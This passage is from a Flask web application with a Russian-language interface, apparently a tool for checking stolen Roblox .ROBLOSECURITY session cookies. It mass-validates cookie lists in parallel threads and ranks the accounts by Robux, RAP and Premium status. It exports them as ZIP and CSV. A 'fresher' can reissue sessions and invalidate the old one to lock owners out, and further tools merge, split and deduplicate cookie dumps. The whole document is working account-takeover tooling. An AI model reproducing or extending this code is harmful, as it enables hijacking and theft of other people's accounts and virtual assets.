                    <div class="menu-item" onclick="alert('Баланс: {{ user.balance }} ₽'); toggleProfileMenu();">💰 Баланс: {{ user.balance }} ₽</div>
                    <div class="menu-item" onclick="location.reload(); toggleProfileMenu();">🔄 Обновить</div>
                </div>
            </div>
        </div>
    </div>

    <!-- TABS -->
    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История</button>
        <button class="tab" data-tab="tools">🧰 Инструменты</button>
        <button class="tab" data-tab="profile">👤 Профиль</button>
    </div>

    <!-- ========== ЧЕКЕР ========== -->
    <div class="tab-content active" id="tab-checker">
        <div class="grid-2">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <button class="btn btn-primary" onclick="runSingleCheck()" style="margin-top:12px;width:100%;">Проверить кук</button>
                <div class="result-container" id="singleContainer" style="display:none;">
                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('singleResult','single_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_singleResult" onclick="toggleBox('singleResult')">▼ Свернуть</button></div></div>
                    <div class="result-box" id="singleResult"></div>
                </div>
            </div>

            <div class="card">
                <h2>📦 Массовая проверка (30 потоков)</h2>
                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>

                <div class="filters-bar">
                    <div class="filter-group"><label>Robux ≥</label><input type="number" id="minRobux" value="0"></div>
                    <div class="filter-group"><label>RAP ≥</label><input type="number" id="minRap" value="0"></div>
                    <div class="filter-group"><input type="checkbox" id="onlyPremium"><label>Только Premium</label></div>
                    <div class="filter-group" style="margin-left:auto;"><label>Сортировка:</label><select id="sortBy"><option value="robux">По Robux ↓</option><option value="rap">По RAP ↓</option><option value="score">По скору ↓</option><option value="username">По имени ↑</option></select></div>
                </div>

                <button class="btn btn-primary" onclick="runMassCheck()" style="margin-top:12px;width:100%;">🚀 Запустить массовый чек</button>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>

                <div class="result-container" id="massContainer" style="display:none;">
                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТЫ:</span><div class="action-btn-group"><button class="btn-download-zip" onclick="downloadMassZip()">📦 ZIP</button><button class="btn-download-csv" onclick="exportCSV()">📊 CSV</button><button class="btn-download-txt" onclick="downloadTxtFromBox('massResult','mass_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼ Свернуть</button></div></div>
                    <div class="result-box" id="massResult"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- ========== ФРЕШЕР ========== -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий (20 потоков)</h2>
            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;flex-wrap:wrap;">
                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим:</span>
                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <button class="btn btn-primary" onclick="runFresher()" style="margin-top:12px;">⚡ Обновить куки</button>
            <div class="result-container" id="fresherContainer" style="display:none;">
                <div class="result-header"><span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('fresherResult','refreshed_cookies.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_fresherResult" onclick="toggleBox('fresherResult')">▼ Свернуть</button></div></div>
                <div class="result-box" id="fresherResult"></div>
            </div>
        </div>
    </div>

    <!-- ========== ИСТОРИЯ ========== -->
    <div class="tab-content" id="tab-history">
        <div class="card">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
                <h2>📋 История Чекера</h2>
                <button class="btn btn-danger btn-sm" onclick="clearHistory('checker')">🗑️ Очистить</button>
            </div>
            <div id="checkerHistoryList">Загрузка...</div>
        </div>
        <div class="card">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
                <h2>🔄 История Фрешера</h2>
                <button class="btn btn-danger btn-sm" onclick="clearHistory('fresher')">🗑️ Очистить</button>
            </div>
            <div id="fresherHistoryList">Загрузка...</div>
        </div>
    </div>

    <!-- ========== ИНСТРУМЕНТЫ ========== -->
    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <div class="card">
                <h3>🔗 Слияние TXT файлов</h3>
                <div class="upload-area" id="mergeDropArea" onclick="document.getElementById('mergeFiles').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файлы</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">выберите сразу несколько файлов</p>
                </div>
                <input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;">
                <div id="mergeFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:12px;width:100%;">Объединить</button>
                <div class="result-box" id="mergeResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>✂️ Разделение по файлам</h3>
                <div class="upload-area" id="splitDropArea" onclick="document.getElementById('splitFiles').click()">
                    <p style="font-weight:700;">📁 Загрузить TXT</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или вставьте куки вручную</p>
                </div>
                <input type="file" id="splitFiles" accept=".txt" multiple style="display:none;">
                <div id="splitFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <textarea id="splitInput" placeholder="Или вставьте куки списком..." rows="3" style="margin-top:10px;"></textarea>
                <div style="margin-top:10px;display:flex;align-items:center;gap:10px;">
                    <label style="font-size:12px;font-weight:700;color:var(--text-muted);">Куков на файл:</label>
                    <input type="number" id="splitCount" value="1" min="1" style="padding:8px 12px;width:100px;">
                </div>
                <button class="btn btn-primary btn-sm" onclick="splitCookies()" style="margin-top:12px;width:100%;">Разделить и скачать ZIP</button>
                <div class="result-box" id="splitResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>🧹 Очистка дубликатов</h3>
                <textarea id="cleanInput" placeholder="Вставьте куки для дедупликации..." rows="5"></textarea>
                <button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:12px;width:100%;">Удалить дубликаты</button>
                <div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div>
            </div>
        </div>
    </div>

    <!-- ========== ПРОФИЛЬ ========== -->
    <div class="tab-content" id="tab-profile">
        <div class="profile-header-card">
            <div class="user-main">
                <img src="https://api.dicebear.com/7.x/bottts/svg?seed={{ username }}" class="big-avatar">
                <div class="user-titles">
                    <h1>{{ username }} <span class="level-badge">☆ Ур. {{ user.level }}</span></h1>
                    <div class="user-email">С нами с {{ user.created_at }}</div>
                    <div class="xp-bar-wrap">
                        <div class="xp-bar"><div class="xp-fill" id="xpFill" style="width: 0%;"></div></div>
                        <div class="xp-text" id="xpText">{{ user.xp }} XP</div>
                    </div>
                </div>
            </div>
            <div class="user-stats-top">
                <div class="stat-item"><div class="val">{{ user.balance }} ₽</div><div class="lbl">Баланс</div></div>
                <div class="stat-item"><div class="val">{{ user.checks_count }}</div><div class="lbl">Проверок</div></div>
                <div class="stat-item"><div class="val">{{ user.cookies_found }}</div><div class="lbl">Найдено акков</div></div>
            </div>
        </div>

        <div class="profile-grid">
            <div>
                <div class="card">
                    <h2>📊 Статистика</h2>
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
                        <div><strong style="font-size:20px;">{{ user.checks_count }}</strong><br><small style="color:var(--text-muted);">Всего проверок</small></div>
                        <div><strong style="font-size:20px;">{{ user.cookies_found }}</strong><br><small style="color:var(--text-muted);">Валидных аккаунтов</small></div>
                        <div><strong style="font-size:20px;">{{ user.premium_found }}</strong><br><small style="color:var(--text-muted);">Premium найдено</small></div>
                        <div><strong style="font-size:20px;">{{ user.rap_found }}</strong><br><small style="color:var(--text-muted);">Акков с RAP > 5000</small></div>
                    </div>
                </div>

                <div class="card">
                    <h2>🏆 Достижения</h2>
                    <div class="achieve-grid" id="achievementsGrid">
                        {% for ach in achievements %}
                        <div class="achieve-card {% if not ach.unlocked %}locked{% endif %}">
                            <div class="icon">{{ ach.icon }}</div>
                            <div class="title">{{ ach.name }}</div>
                            <div class="xp">{{ ach.xp }}</div>
                        </div>
                        {% endfor %}
                    </div>
                </div>
            </div>

            <div>
                <div class="card">
                    <h2>💰 Баланс</h2>
                    <div style="font-size:42px;font-weight:900;color:var(--accent-pink);">{{ user.balance }} ₽</div>
                    <p style="color:var(--text-muted);font-size:12px;margin-top:8px;">Зарабатывайте XP и пополняйте баланс через активность</p>
                </div>

                <div class="card">
                    <h2>🔄 Прогресс уровня</h2>
                    <div class="xp-bar" style="height:12px;border-radius:10px;overflow:hidden;background:rgba(255,255,255,0.1);">
                        <div class="xp-fill" id="levelProgress" style="width:0%;height:100%;"></div>
                    </div>
                    <div style="display:flex;justify-content:space-between;margin-top:8px;font-size:12px;color:var(--text-muted);">
                        <span>Ур. {{ user.level }}</span>
                        <span>Ур. {{ user.level + 1 }}</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">KAI CHECKER PRO © 2026</div>
</div>

<script>
// ==========================================
// PARTICLE SYSTEM
// ==========================================
const canvas = document.getElementById('particles-canvas');
const ctx = canvas.getContext('2d');
let particles = [];

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

for (let i = 0; i < 50; i++) {
    particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        r: Math.random() * 2 + 1,
        dx: (Math.random() - 0.5) * 0.5,
        dy: (Math.random() - 0.5) * 0.5,
        alpha: Math.random() * 0.3 + 0.1
    });
}

function animateParticles() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(217, 70, 239, ${p.alpha})`;
        ctx.shadowBlur = 6;
        ctx.shadowColor = '#a855f7';
        ctx.fill();
        p.x += p.dx;
        p.y += p.dy;
        if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
    });
    requestAnimationFrame(animateParticles);
}
animateParticles();

// ==========================================
// THEME TOGGLE
// ==========================================
function toggleTheme() {
    const html = document.documentElement;
    html.setAttribute('data-theme', html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
    localStorage.setItem('theme', html.getAttribute('data-theme'));
}
document.addEventListener('DOMContentLoaded', function() {
    const saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
    
    // Обновляем XP бар
    const xp = {{ user.xp }};
    const level = {{ user.level }};
    const xpInLevel = xp % 1000;
    const percent = (xpInLevel / 1000) * 100;
    document.getElementById('xpFill').style.width = percent + '%';
    document.getElementById('levelProgress').style.width = percent + '%';
    document.getElementById('xpText').textContent = xp + ' XP';
});

// ==========================================
// PROFILE MENU
// ==========================================
function toggleProfileMenu() {
    document.getElementById('profileMenu').classList.toggle('show');
}
document.addEventListener('click', function(e) {
    const widget = document.querySelector('.profile-widget');
    if (widget && !widget.contains(e.target)) {
        document.getElementById('profileMenu').classList.remove('show');
    }
});

// ==========================================
// TABS
// ==========================================
function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
    const targetContent = document.getElementById('tab-' + tabName);
    if (targetBtn && targetContent) {
        targetBtn.classList.add('active');
        targetContent.classList.add('active');
        if (tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
});

// ==========================================
// ALERT
// ==========================================
let alertTimeout;
function showAlert(msg) {
    document.getElementById('custom-alert-msg').innerText = msg || 'Вставьте кук!';
    document.getElementById('custom-alert').classList.add('show');
    clearTimeout(alertTimeout);
    alertTimeout = setTimeout(function() {
        document.getElementById('custom-alert').classList.remove('show');
    }, 4000);
}
function closeAlert() {
    document.getElementById('custom-alert').classList.remove('show');
}

// ==========================================
// UTILITY
// ==========================================
function toggleBox(boxId) {
    const box = document.getElementById(boxId);
    const btn = document.getElementById('btnToggle_' + boxId);
    if (!box) return;
    if (box.style.display === 'none') {
        box.style.display = 'block';
        if (btn) btn.textContent = '▼ Свернуть';
    } else {
        box.style.display = 'none';
        if (btn) btn.textContent = '▶ Развернуть';
    }
}

function downloadTxtFromBox(boxId, defaultFilename) {
    const box = document.getElementById(boxId);
    if (!box || !box.textContent.trim()) return showAlert('Нет данных!');
    const blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = defaultFilename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// ==========================================
// DRAG & DROP
// ==========================================
function setupDragAndDrop(areaId, inputId, infoId) {
    const area = document.getElementById(areaId);
    const input = document.getElementById(inputId);
    const info = document.getElementById(infoId);
    if (!area || !input) return;

    ['dragenter', 'dragover'].forEach(e => area.addEventListener(e, function(prev) {
        prev.preventDefault();
        area.classList.add('drag-over');
    }));
    ['dragleave', 'drop'].forEach(e => area.addEventListener(e, function(prev) {
        prev.preventDefault();
        area.classList.remove('drag-over');
    }));
    area.addEventListener('drop', function(e) {
        if (e.dataTransfer.files.length) {
            input.files = e.dataTransfer.files;
            if (info) info.textContent = 'Выбрано файлов: ' + input.files.length + ' (' + input.files[0].name + ')';
        }
    });
    input.addEventListener('change', function() {
        if (this.files.length && info) {
            info.textContent = 'Выбрано файлов: ' + this.files.length + ' (' + this.files[0].name + ')';
        }
    });
}

setupDragAndDrop('massDropArea', 'massFile', 'massFileInfo');
setupDragAndDrop('mergeDropArea', 'mergeFiles', 'mergeFileInfo');
setupDragAndDrop('splitDropArea', 'splitFiles', 'splitFileInfo');

// ==========================================
// API CALLS
// ==========================================
let lastMassReports = [];

async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if (!cookie) return showAlert('Вставьте кук!');
    document.getElementById('singleContainer').style.display = 'block';
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('btnToggle_singleResult').textContent = '▼ Свернуть';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';

    const res = await fetch('/api/single-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie })
    });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if (!file) return showAlert('Выберите TXT файл!');

    const fd = new FormData();
    fd.append('file', file);
    fd.append('min_robux', document.getElementById('minRobux').value || 0);
    fd.append('min_rap', document.getElementById('minRap').value || 0);
    fd.append('only_premium', document.getElementById('onlyPremium').checked);
    fd.append('sort_by', document.getElementById('sortBy').value);

    document.getElementById('massContainer').style.display = 'block';
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
    document.getElementById('massProgress').style.width = '50%';
    document.getElementById('massResult').textContent = '⏳ Массовая проверка...';

    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    document.getElementById('massProgress').style.width = '100%';
    setTimeout(() => document.getElementById('massProgress').style.width = '0%', 1000);

    if (data.success) {
        lastMassReports = data.full_reports || [];
        document.getElementById('massResult').textContent = data.results.join('\n\n');
    }
}

async function downloadMassZip() {
    if (!lastMassReports.length) return showAlert('Нет данных!');
    const res = await fetch('/api/download-zip', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ reports: lastMassReports })
    });
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'accounts_reports.zip';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

async function exportCSV() {
    if (!lastMassReports.length) return showAlert('Нет данных!');
    const res = await fetch('/api/export-csv', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ results: lastMassReports })
    });
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'accounts_' + new Date().toISOString().slice(0,10) + '.csv';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// ==========================================
// FRESHER
// ==========================================
function setFresherMode(m) {
    document.getElementById('fresherMode').value = m;
    document.getElementById('btnDup').classList.toggle('active-mode', m === 'duplicate');
    document.getElementById('btnKill').classList.toggle('active-mode', m === 'kill');
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    const mode = document.getElementById('fresherMode').value;
    if (!cookies) return showAlert('Вставьте куки!');
    document.getElementById('fresherContainer').style.display = 'block';
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('btnToggle_fresherResult').textContent = '▼ Свернуть';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';

    const res = await fetch('/api/fresher', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookies, mode })
    });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

// ==========================================
// HISTORY
// ==========================================
async function loadCheckerHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.forEach(i => {
        html += `<div class="history-card"><div class="history-header"><span>🕒 ${i.timestamp} — Валид: ${i.valid}/${i.total}</span></div><pre style="margin-top:6px;font-size:11px;">${i.results ? i.results.join('\n') : ''}</pre></div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
}

async function loadFresherHistory() {
    const res = await fetch('/api/history/fresher');
    const data = await res.json();
    let html = '';
    data.history.forEach(i => {
        html += `<div class="history-card"><div class="history-header"><span>🕒 ${i.timestamp} — Обновлено: ${i.refreshed_count} шт.</span></div><pre style="margin-top:6px;font-size:11px;">${i.cookies ? i.cookies.join('\n') : ''}</pre></div>`;
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
}

async function clearHistory(type) {
    if (!confirm('Очистить историю?')) return;
    const res = await fetch('/api/history/clear/' + type, { method: 'POST' });
    if ((await res.json()).success) {
        if (type === 'checker') loadCheckerHistory();
        else loadFresherHistory();
    }
}

// ==========================================
// TOOLS
// ==========================================
async function mergeCookies() {
    const files = document.getElementById('mergeFiles').files;
    if (files.length < 2) return showAlert('Выберите минимум 2 TXT файла!');
    const fd = new FormData();
    Array.from(files).forEach(f => fd.append('files', f));
    const box = document.getElementById('mergeResult');
    box.style.display = 'block';
    box.textContent = '⏳ Объединение...';
    const res = await fetch('/api/merge-cookies', { method: 'POST', body: fd });
    const data = await res.json();
    if (data.success) {
        box.innerHTML = '✅ Успешно! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
    } else {
        box.textContent = '❌ Ошибка';
    }
}

async function splitCookies() {
    const files = document.getElementById('splitFiles').files;
    const textInput = document.getElementById('splitInput').value;
    const perFile = parseInt(document.getElementById('splitCount').value) || 1;
    if (!files.length && !textInput.trim()) return showAlert('Загрузите файл или вставьте куки!');
    const fd = new FormData();
    Array.from(files).forEach(f => fd.append('files', f));
    fd.append('text', textInput);
    fd.append('per_file', perFile);
    const box = document.getElementById('splitResult');
    box.style.display = 'block';
    box.textContent = '⏳ Разделение...';
    const res = await fetch('/api/split-cookies', { method: 'POST', body: fd });
    const data = await res.json();
    if (data.success) {
        box.innerHTML = '✅ Разделено на ' + data.total_files + ' файлов! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📦 Скачать ZIP</a>';
    } else {
        box.textContent = data.message || '❌ Ошибка';
    }
}

async function cleanCookies() {
    const content = document.getElementById('cleanInput').value;
    if (!content.trim()) return showAlert('Вставьте куки!');
    const box = document.getElementById('cleanResult');
    box.style.display = 'block';
    box.textContent = '⏳ Очистка...';
    const res = await fetch('/api/clean-cookies', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
    });
    const data = await res.json();
    if (data.success) {
        box.innerHTML = '✅ Уникальных: ' + data.count + ' шт. <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
    } else {
        box.textContent = '❌ Ошибка';
    }
}

// Загрузка истории при открытии вкладки
document.addEventListener('DOMContentLoaded', function() {
    // Активируем первую вкладку
    activateTab('checker');
});
</script>
</body>
</html>"""

# ==========================================
# FLASK ROUTES
# ==========================================
@app.route("/")
def index():
    user = get_user()
    if not user:
        # Создаем нового пользователя
        session['user_id'] = str(uuid.uuid4())
        session['username'] = f"User_{session['user_id'][:6]}"
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO users (session_id, username, created_at) VALUES (?, ?, ?)",
                  (session['user_id'], session['username'], datetime.now().strftime('%d.%m.%Y')))
        conn.commit()
        conn.close()
        user = get_user()
    
    achievements = get_achievements(user)
    
    return render_template_string(HTML, 
                                  username=session.get('username', 'Guest'),
                                  user=user,
                                  achievements=achievements)

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie:
        return jsonify({"success": False, "message": "Кук не предоставлен"})
    
    info = get_full_info(cookie)
    report = format_full_report(info)
    
    # Сохраняем в историю
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO checker_history (session_id, timestamp, type, total, valid, results) VALUES (?, ?, ?, ?, ?, ?)",
              (session.get('user_id', 'unknown'), datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'single', 1, 
               1 if info['status'] == '✅' else 0, json.dumps([report])))
    conn.commit()
    conn.close()
    
    # Обновляем статистику пользователя
    if info['status'] == '✅':
        update_user_stats(session.get('user_id'), 1, 1, info.get('IsPremium', False), info.get('RAP') or 0)
    
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    content = ""
    if 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    
    min_robux = int(request.form.get('min_robux', 0))
    min_rap = int(request.form.get('min_rap', 0))
    only_premium = request.form.get('only_premium', 'false') == 'true'
    sort_by = request.form.get('sort_by', 'robux')
    
    cookies = extract_cookies_from_text(content)
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    results = mass_check(cookies)
    
    # Фильтрация
    valid = [r for r in results if r['status'] == '✅']
    if min_robux > 0:
        valid = [r for r in valid if r.get('robux', 0) >= min_robux]
    if min_rap > 0:
        valid = [r for r in valid if (r.get('rap') or 0) >= min_rap]
    if only_premium:
        valid = [r for r in valid if r.get('is_premium', False)]
    
    # Сортировка
    if sort_by == 'username':
        valid.sort(key=lambda x: x.get('username', ''))
    else:
        valid.sort(key=lambda x: x.get(sort_by, 0), reverse=True)
    
    formatted = [format_quick_report(r) for r in valid]
    
    full_reports = []
    premium_count = 0
    for r in valid:
        if r.get('full_info'):
            full_reports.append({
                'username': r['username'],
                'user_id': r['user_id'],
                'report': format_full_report(r['full_info'])
            })
            if r.get('is_premium'):
                premium_count += 1
            # Обновляем статистику пользователя
            update_user_stats(session.get('user_id'), 1, 1, r.get('is_premium', False), r.get('rap') or 0)
    
    # Сохраняем в историю
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO checker_history (session_id, timestamp, type, total, valid, results) VALUES (?, ?, ?, ?, ?, ?)",
              (session.get('user_id', 'unknown'), datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'mass', 
               len(results), len(valid), json.dumps(formatted)))
    conn.commit()
    conn.close()
    
    return jsonify({
        "success": True,
        "valid_count": len(valid),
        "premium_count": premium_count,
        "total_robux": sum(r.get('robux', 0) for r in valid),
        "results": formatted,
        "full_reports": full_reports
    })

@app.route("/api/download-zip", methods=["POST"])
def api_download_zip():
    data = request.json or {}
    reports = data.get("reports", [])
    if not reports:
        return jsonify({"success": False, "message": "Нет отчетов"})
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for r in reports:
            fname = f"{r.get('username','user')}_{r.get('user_id','id')}.txt"
            zf.writestr(fname, r.get('report', ''))
    
    zip_buffer.seek(0)
    return send_file(zip_buffer, mimetype="application/zip", as_attachment=True, download_name="roblox_accounts.zip")

@app.route("/api/export-csv", methods=["POST"])
def api_export_csv():
    import csv
    data = request.json or {}
    reports = data.get("results", [])
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Username', 'UserID', 'Robux', 'RAP', 'Premium', '2FA', 'Email', 'Playtime'])
    
    for r in reports:
        if r.get('status') == '✅':
            writer.writerow([
                r.get('username', '?'),
                r.get('user_id', '?'),
                r.get('robux', 0),
                r.get('rap') or 0,
                'Да' if r.get('is_premium') else 'Нет',
                'Да' if r.get('has_2fa') else 'Нет',
                'Да' if r.get('has_email') else 'Нет',
                r.get('playtime') or 0
            ])
    
    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode('utf-8-sig')),
        mimetype='text/csv',
        as_attachment=True,
        download_name=f'accounts_{int(time.time())}.csv'
    )

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    usernames = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c, mode == 'kill') for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res['success'] and res['new_cookie']:
                only_cookies.append(res['new_cookie'])
                usernames.append(res.get('username', '?'))
    
    # Сохраняем в историю
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO fresher_history (session_id, timestamp, refreshed_count, cookies) VALUES (?, ?, ?, ?)",
              (session.get('user_id', 'unknown'), datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 
               len(only_cookies), json.dumps(only_cookies)))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
def api_history_checker():
    sid = session.get('user_id', 'unknown')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT timestamp, type, total, valid, results FROM checker_history WHERE session_id=? ORDER BY id DESC LIMIT 50", (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0], 'type': r[1], 'total': r[2], 'valid': r[3],
            'results': json.loads(r[4]) if r[4] else []
        })
    
    return jsonify({"history": history})

@app.route("/api/history/fresher")
def api_history_fresher():
    sid = session.get('user_id', 'unknown')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT timestamp, refreshed_count, cookies FROM fresher_history WHERE session_id=? ORDER BY id DESC LIMIT 50", (sid,))
    rows = c.fetchall()
    conn.close()
    
    history = []
    for r in rows:
        history.append({
            'timestamp': r[0], 'refreshed_count': r[1],
            'cookies': json.loads(r[2]) if r[2] else []
        })
    
    return jsonify({"history": history})

@app.route("/api/history/clear/<type>", methods=["POST"])
def api_clear_history(type):
    sid = session.get('user_id', 'unknown')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    if type == 'checker':
        c.execute("DELETE FROM checker_history WHERE session_id=?", (sid,))
    elif type == 'fresher':
        c.execute("DELETE FROM fresher_history WHERE session_id=?", (sid,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    files = request.files.getlist('files')
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    
    user_dir = os.path.join("downloads", session.get('user_id', 'default'))
    os.makedirs(user_dir, exist_ok=True)
    filename = f"merged_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(merged)
    
    return jsonify({"success": True, "download_url": f"/downloads/{session.get('user_id', 'default')}/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    files = request.files.getlist('files')
    text_input = request.form.get('text', '')
    per_file = int(request.form.get('per_file', 1))
    
    all_contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    if text_input:
        all_contents.append(text_input)
    
    cookies = extract_cookies_from_text('\n'.join(all_contents))
    if not cookies:
